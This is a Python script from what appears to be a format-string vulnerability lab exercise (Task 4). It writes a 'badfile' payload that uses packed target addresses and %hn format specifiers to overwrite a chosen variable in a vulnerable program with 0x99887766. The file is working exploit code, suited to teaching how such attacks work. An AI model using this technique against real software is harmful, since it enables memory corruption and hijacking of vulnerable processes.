# hyper parameters
BADFILE_LENGTH = 1000
N_BYTES_PER_ADDRESS = 4

# create badfile with NOP (0x90)
badfile = bytearray(0x90 for _ in range(BADFILE_LENGTH))

"""TASK 4
Change target variable to large value
"""
# try to use the address of target_1 (local in fmttr) or target_2 (local in main) or target_3(global) and see the difference
# Address of target_1: 0xffffcfc4 (in stack)
# Address of target_2: 0xffffd3c8 (in stack)
# Address of target_3: 0x56559008 (in data segment)
# Address of target_4[0]: 0x5655a1a0 (in heap)
# Address of target_4[1]: 0x5655a1a4 (in heap)

target_address = 0xffffcfc4 # (1) address of the target variable we want to change
n_steps = 17 # (2) number of steps we need the va_list pointer to move (inferred via 2_badfile)

# low address of the target
current_index = 0
badfile[current_index : current_index + 4] = (target_address).to_bytes(4, byteorder="little")
current_index += 4

# !!! critical to add four random bytes
badfile[current_index : current_index + 4] = b"!!!!"
current_index += 4

# high address of the target
badfile[current_index : current_index + 4] = (target_address + 2).to_bytes(4, byteorder="little")
current_index += 4

# new value 0x99887766, what we should do if new value is 0x77669988
small_value = 0x7766
large_value = 0x9988

# specify first 2 bytes (small)
n_chars = 4 * 3 + 8 * (n_steps - 1)
fmt = ("%.8x" * (n_steps - 1) + f"%.{small_value - n_chars}x" + "%hn").encode()
badfile[current_index : current_index + len(fmt)] = fmt
current_index += len(fmt)

# specify second 2 bytes (large)
fmt = (f"%.{large_value - small_value}x" + "%hn").encode()
badfile[current_index : current_index + len(fmt)] = fmt
current_index += len(fmt)

with open("4_badfile", "wb") as f:
    f.write(badfile[:current_index])
print("4_badfile (optional) is generated successfully!")